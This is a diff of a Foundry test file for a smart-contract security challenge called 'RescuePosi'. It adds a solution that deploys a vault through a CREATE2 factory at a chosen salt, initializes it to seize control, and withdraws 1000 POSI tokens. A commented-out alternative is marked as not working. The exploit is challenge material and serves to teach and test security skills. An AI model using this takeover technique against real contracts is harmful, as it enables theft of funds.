@@ -11,8 +11,6 @@ import {PosiCoin} from "../src/4_RescuePosi/PosiCoin.sol";
 //    If you need a contract for your hack, define it below //
 ////////////////////////////////////////////////////////////*/
 
-
-
 /*////////////////////////////////////////////////////////////
 //                     TEST CONTRACT                        //
 ////////////////////////////////////////////////////////////*/
@@ -36,7 +34,6 @@ contract Challenge4Test is Test {
         POSI.transfer(unclaimedAddress, 1000 ether);
     }
 
-
     function testWhitehatRescue() public {
         vm.deal(whitehat, 10 ether);
         vm.startPrank(whitehat, whitehat);
@@ -46,13 +43,24 @@ contract Challenge4Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge4Test -vvvv //
         ////////////////////////////////////////////////////*/
+        bytes memory bytecode = type(VaultWalletTemplate).creationCode;
+        VaultWalletTemplate vault = VaultWalletTemplate(payable(FACTORY.deploy(bytecode, 11)));
 
+        // patrickd solution - doesn't work
+        // bytes memory data = abi.encodeWithSignature("deploy(bytes,uint256)", type(VaultWalletTemplate).creationCode, 11);
+        // FACTORY.callWallet(address(FACTORY), data);
 
-
+        vault.initialize(whitehat);
+        vault.withdrawERC20(address(POSI), 1000 ether, devs);
 
         //==================================================//
         vm.stopPrank();
 
         assertEq(POSI.balanceOf(devs), 1000 ether, "devs' POSI balance should be 1000 POSI");
+    }
+
+    function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {
+        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(FACTORY), _salt, keccak256(bytecode)));
+        return address(uint160(uint256(hash)));
     }
 }
